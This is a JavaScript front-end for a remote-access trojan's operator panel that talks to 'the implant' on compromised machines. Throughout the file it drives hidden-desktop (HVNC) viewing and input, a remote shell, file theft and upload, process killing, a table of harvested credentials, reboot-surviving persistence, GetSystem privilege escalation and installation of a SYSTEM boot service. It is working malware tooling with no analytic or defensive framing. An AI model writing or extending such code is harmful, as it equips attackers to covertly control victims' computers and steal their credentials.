"use strict";

const root = document.getElementById("session-root");
let sessionId = root.dataset.session;
const sessionHost = root.dataset.host || "";
const rdPort = location.port && location.port !== "443" ? `:${location.port}` : "";

// The implant mints a new session id on every reconnect. If the id in the URL is
// dead, rebind the drawer to the live session for the same host so every action
// targets something that exists.
async function resolveSession() {
  try {
    const resp = await fetch("/api/sessions");
    const data = await resp.json();
    const list = data.sessions || [];
    if (!list.some((s) => s.id === sessionId)) {
      const match = list.find((s) => s.host === sessionHost) || list[0];
      if (match) sessionId = match.id;
    }
  } catch (err) {
    /* offline: keep current id */
  }
  return sessionId;
}

function show(tab) {
  document.querySelectorAll("section.panel").forEach((el) => el.classList.add("hidden"));
  document.querySelectorAll("button.tab").forEach((el) => el.classList.remove("active"));
  document.getElementById(`tab-${tab}`).classList.remove("hidden");
  document.querySelector(`button.tab[data-tab="${tab}"]`).classList.add("active");
  if (tab === "shell") startShell();
  if (tab === "files") listFiles(".");
  if (tab === "procs") listProcs();
  if (tab === "info") loadInfo();
  if (tab === "creds") loadCreds();
}
document.querySelectorAll("button.tab").forEach((btn) =>
  btn.addEventListener("click", () => show(btn.dataset.tab))
);

/* ---------------- desktop ---------------- */
let rdSocket = null;
let term = null;

function wsUrl(path) {
  const proto = location.protocol === "https:" ? "wss:" : "ws:";
  return `${proto}//${location.host}${path}`;
}

async function connectDesktop(skipLaunch) {
  await resolveSession();
  if (rdSocket && rdSocket.readyState <= 1) return;
  const canvas = document.getElementById("rd-canvas");
  const status = document.getElementById("rd-status");
  if (window.__rdPoll) { clearInterval(window.__rdPoll); window.__rdPoll = null; }
  try { canvas.getContext("2d").clearRect(0, 0, canvas.width, canvas.height); } catch (err) {}
  // ask the panel to upload+launch the rd helper on the target (best effort)
  if (!skipLaunch) {
    try {
      await fetch(`/api/${sessionId}/desktop`, {
        method: "POST", headers: { "Content-Type": "application/json" }, body: "{}",
      });
    } catch (err) { /* helper may already be running */ }
  }
  status.textContent = "connecting…";
  rdSocket = new WebSocket(wsUrl(`/rd/${sessionId}`));
  rdSocket.binaryType = "blob";
  rdSocket.onopen = () => { status.textContent = "broker connected"; canvas.focus(); };
  rdSocket.onclose = () => { status.textContent = "helper not connected"; };
  rdSocket.ontext = null;
  let gotFrame = false;
  let frameCount = 0;
  let wsFrames = 0;
  function drawBitmap(src) {
    canvas.width = src.width;
    canvas.height = src.height;
    canvas.getContext("2d").drawImage(src, 0, 0);
    frameCount += 1;
    if (frameCount <= 3 || frameCount % 30 === 0) {
      status.textContent = "streaming " + src.width + "x" + src.height + " · frame " + frameCount;
    }
  }
  setTimeout(function () { if (!gotFrame) status.textContent = "no frames yet — helper starting or blocked"; }, 6000);
  rdSocket.onmessage = async (event) => {
    if (typeof event.data === "string") {
      try {
        const msg = JSON.parse(event.data);
        if (msg.t === "hello") {
          canvas.width = msg.w || canvas.width;
          canvas.height = msg.h || canvas.height;
          window.__rdCaps = msg.caps || [];
          const hvncBtn = document.getElementById("hvnc-start");
          if (msg.hvnc === false) {
            hvncBtn.disabled = true;
            hvncBtn.title = msg.reason || "HVNC unavailable for this helper";
            status.textContent = msg.reason || "HVNC unavailable";
          } else if ((msg.caps || []).includes("hvnc")) {
            hvncBtn.disabled = false;
            hvncBtn.title = "hidden desktop available";
          }
          if (msg.view_only) status.textContent = "view only (no DISPLAY)";
          else if (msg.hvnc !== false) status.textContent = "streaming (" + (msg.mode || "desktop") + ")";
        }
      } catch (err) { /* non-fatal */ }
      return;
    }
    gotFrame = true;
    wsFrames += 1;
    if (window.__rdPoll) { clearInterval(window.__rdPoll); window.__rdPoll = null; }
    try {
      drawBitmap(await createImageBitmap(event.data));
    } catch (err) {
      const url = URL.createObjectURL(event.data);
      const img = new Image();
      img.onload = () => { drawBitmap(img); URL.revokeObjectURL(url); };
      img.onerror = () => { status.textContent = "frame decode error"; URL.revokeObjectURL(url); };
      img.src = url;
    }
  };

  const send = (obj) => rdSocket && rdSocket.readyState === 1 && rdSocket.send(JSON.stringify(obj));
  const norm = (ev) => {
    const rect = canvas.getBoundingClientRect();
    return {
      x: Math.min(1, Math.max(0, (ev.clientX - rect.left) / rect.width)),
      y: Math.min(1, Math.max(0, (ev.clientY - rect.top) / rect.height)),
    };
  };
  canvas.onmousemove = (ev) => { const p = norm(ev); send({ t: "m", x: p.x, y: p.y }); };
  canvas.onmousedown = (ev) => { ev.preventDefault(); canvas.focus(); send({ t: "b", btn: ev.button, down: 1 }); };
  canvas.onmouseup = (ev) => send({ t: "b", btn: ev.button, down: 0 });
  canvas.oncontextmenu = (ev) => ev.preventDefault();
  canvas.onwheel = (ev) => send({ t: "b", btn: ev.deltaY < 0 ? 4 : 5, down: 1 });
  canvas.onkeydown = (ev) => { ev.preventDefault(); send({ t: "k", code: ev.keyCode, down: 1 }); };
  canvas.onkeyup = (ev) => { ev.preventDefault(); send({ t: "k", code: ev.keyCode, down: 0 }); };

  // if binary WS frames don't arrive (proxy/CDN/browser), fall back to snapshots
  setTimeout(function () {
    if (gotFrame) return;
    window.__rdPoll = setInterval(function () {
      if (wsFrames > 0) { clearInterval(window.__rdPoll); window.__rdPoll = null; return; }
      const img = new Image();
      img.onload = function () {
        drawBitmap(img);
        gotFrame = true;
        status.textContent = "streaming (snapshot " + img.width + "x" + img.height + ")";
      };
      img.src = "/api/" + sessionId + "/frame.jpg?t=" + Date.now();
    }, 400);
  }, 3500);
}

/* ---------------- shell ---------------- */
async function startShell() {
  await resolveSession();
  if (term || typeof Terminal === "undefined") return;
  term = new Terminal({ fontSize: 12, theme: { background: "#0d1117", foreground: "#c9d1d9" } });
  term.open(document.getElementById("term"));
  const socket = new WebSocket(wsUrl(`/shell/${sessionId}`));
  socket.binaryType = "arraybuffer";
  socket.onmessage = (event) => term.write(new Uint8Array(event.data));
  socket.onclose = () => term.write("\r\n[disconnected]\r\n");
  term.onData((data) => socket.readyState === 1 && socket.send(data));
  term.onResize(({ rows, cols }) => socket.readyState === 1 && socket.send(JSON.stringify({ rows, cols })));
}

/* ---------------- files ---------------- */
async function listFiles(path) {
  await resolveSession();
  document.getElementById("files-path").value = path;
  const resp = await fetch(`/api/${sessionId}/ls`, {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ path }),
  });
  const body = document.getElementById("files-body");
  body.innerHTML = "";
  if (!resp.ok) { body.innerHTML = `<tr><td colspan="4" class="error">${await resp.text()}</td></tr>`; return; }
  const data = await resp.json();
  (data.files || []).sort((a, b) => a.name.localeCompare(b.name)).forEach((file) => {
    const tr = document.createElement("tr");
    const link = file.is_dir ? `<a href="#" data-dir="${file.name}">${file.name}/</a>` : file.name;
    tr.innerHTML = `<td>${link}</td><td>${file.is_dir ? "" : file.size}</td><td>${file.mode}</td>`;
    const actions = document.createElement("td");
    if (!file.is_dir) {
      const dl = document.createElement("a");
      dl.textContent = "dl";
      dl.href = `/api/${sessionId}/download?path=${encodeURIComponent(joinPath(path, file.name))}`;
      actions.appendChild(dl);
    }
    tr.appendChild(actions);
    body.appendChild(tr);
  });
  body.querySelectorAll("a[data-dir]").forEach((a) =>
    a.addEventListener("click", (ev) => { ev.preventDefault(); listFiles(joinPath(path, a.dataset.dir)); })
  );
}

function joinPath(base, name) {
  return base.endsWith("/") ? base + name : `${base}/${name}`;
}

document.getElementById("files-go").addEventListener("click", () =>
  listFiles(document.getElementById("files-path").value || ".")
);
document.getElementById("files-upload").addEventListener("change", async (ev) => {
  const file = ev.target.files[0];
  if (!file) return;
  const form = new FormData();
  form.append("path", document.getElementById("files-path").value || ".");
  form.append("file", file);
  await fetch(`/api/${sessionId}/upload`, { method: "POST", body: form });
  listFiles(document.getElementById("files-path").value || ".");
});

/* ---------------- procs ---------------- */
async function listProcs() {
  await resolveSession();
  const resp = await fetch(`/api/${sessionId}/ps`, { method: "POST" });
  const body = document.getElementById("procs-body");
  body.innerHTML = "";
  if (!resp.ok) return;
  const data = await resp.json();
  (data.processes || []).forEach((proc) => {
    const tr = document.createElement("tr");
    tr.innerHTML = `<td>${proc.pid}</td><td>${proc.ppid}</td><td>${proc.owner || ""}</td><td>${proc.executable || ""}</td>`;
    const td = document.createElement("td");
    const kill = document.createElement("button");
    kill.textContent = "kill";
    kill.className = "link";
    kill.addEventListener("click", async () => {
      await fetch(`/api/${sessionId}/kill`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pid: proc.pid }),
      });
      listProcs();
    });
    td.appendChild(kill);
    tr.appendChild(td);
    body.appendChild(tr);
  });
}
document.getElementById("procs-refresh").addEventListener("click", listProcs);

/* ---------------- info ---------------- */
async function loadInfo() {
  await resolveSession();
  const resp = await fetch(`/api/${sessionId}/info`);
  const data = await resp.json();
  document.getElementById("info-body").textContent = JSON.stringify(data, null, 2);
}

/* ---------------- credentials ---------------- */
async function loadCreds() {
  await resolveSession();
  const resp = await fetch(`/api/${sessionId}/creds`);
  const body = document.getElementById("creds-body");
  body.innerHTML = "";
  if (!resp.ok) return;
  const data = await resp.json();
  (data.creds || []).forEach((cred) => {
    const tr = document.createElement("tr");
    tr.innerHTML =
      `<td>${new Date((cred.ts || 0) * 1000).toLocaleString()}</td>` +
      `<td>${cred.username || ""}</td>` +
      `<td class="mono">${cred.secret || ""}</td>` +
      `<td>${cred.source || ""}</td>`;
    body.appendChild(tr);
  });
}

/* ---------------- HVNC ---------------- */
document.getElementById("hvnc-start").addEventListener("click", async () => {
  await resolveSession();
  const status = document.getElementById("rd-status");
  // drop the old desktop stream so HVNC frames don't interleave with it
  try { if (rdSocket) { rdSocket.onclose = null; rdSocket.close(); rdSocket = null; } } catch (err) {}
  const canvas = document.getElementById("rd-canvas");
  try { canvas.getContext("2d").clearRect(0, 0, canvas.width, canvas.height); } catch (err) {}
  status.textContent = "starting hidden desktop…";
  try {
    const resp = await fetch(`/api/${sessionId}/hvnc`, { method: "POST", headers: {
      "Content-Type": "application/json" }, body: JSON.stringify({}) });
    const data = await resp.json();
    status.textContent = resp.ok ? "HVNC launched — connecting" : (data.detail || "HVNC failed");
  } catch (err) {
    status.textContent = "HVNC request failed";
  }
  setTimeout(() => connectDesktop(true), 250);
});

document.getElementById("persist").addEventListener("click", async () => {
  await resolveSession();
  const status = document.getElementById("rd-status");
  status.textContent = "installing unattended persistence…";
  try {
    const resp = await fetch(`/api/${sessionId}/persist`, {
      method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({}),
    });
    const data = await resp.json();
    status.textContent = resp.ok
      ? "persistence installed — survives reboot, reachable with no user logged in"
      : ("persist failed: " + (data.detail || resp.status));
  } catch (err) {
    status.textContent = "persist request failed";
  }
});

document.getElementById("getsystem").addEventListener("click", async () => {
  await resolveSession();
  const status = document.getElementById("rd-status");
  status.textContent = "escalating to SYSTEM…";
  try {
    const resp = await fetch(`/api/${sessionId}/getsystem`, {
      method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({}),
    });
    const data = await resp.json();
    status.textContent = resp.ok
      ? "GetSystem spawned — a new SYSTEM session should appear in the table"
      : ("GetSystem failed: " + (data.detail || resp.status));
  } catch (err) {
    status.textContent = "GetSystem request failed";
  }
});

document.getElementById("service").addEventListener("click", async () => {
  await resolveSession();
  const status = document.getElementById("rd-status");
  status.textContent = "installing boot service (SYSTEM)…";
  try {
    const resp = await fetch(`/api/${sessionId}/service`, {
      method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({}),
    });
    const data = await resp.json();
    status.textContent = resp.ok
      ? `service ${data.service} installed; auto-starts at boot with no user logged in`
      : ("service install failed: " + (data.detail || resp.status));
  } catch (err) {
    status.textContent = "service request failed";
  }
});

document.getElementById("hvnc-spawn-go").addEventListener("click", () => {
  const value = document.getElementById("hvnc-spawn").value.trim();
  if (!value || !rdSocket || rdSocket.readyState !== 1) return;
  rdSocket.send(JSON.stringify({ t: "spawn", cmd: value }));
});

async function openViewer(mode) {
  await resolveSession();
  window.open(`/viewer/${sessionId}?mode=${mode}`, `fleet-${mode}-${sessionId}`,
    "width=1320,height=860,menubar=no,toolbar=no");
}
const rdWindowBtn = document.getElementById("rd-window");
if (rdWindowBtn) rdWindowBtn.addEventListener("click", () => openViewer("desktop"));
const hvncWindowBtn = document.getElementById("hvnc-window");
if (hvncWindowBtn) hvncWindowBtn.addEventListener("click", () => openViewer("hvnc"));

document.getElementById("rd-connect").addEventListener("click", async () => {
  // force a fresh mirror stream (drops a running HVNC/desktop helper)
  try { if (rdSocket) { rdSocket.onclose = null; rdSocket.close(); rdSocket = null; } } catch (err) {}
  await connectDesktop();
});

function toggleFullscreen() {
  const canvas = document.getElementById("rd-canvas");
  if (document.fullscreenElement) {
    document.exitFullscreen().catch(() => {});
  } else if (canvas && canvas.requestFullscreen) {
    canvas.requestFullscreen().catch(() => {});
  }
}
const fullBtn = document.getElementById("rd-full");
if (fullBtn) fullBtn.addEventListener("click", toggleFullscreen);
const rdCanvasEl = document.getElementById("rd-canvas");
if (rdCanvasEl) rdCanvasEl.addEventListener("dblclick", toggleFullscreen);

show("desktop");
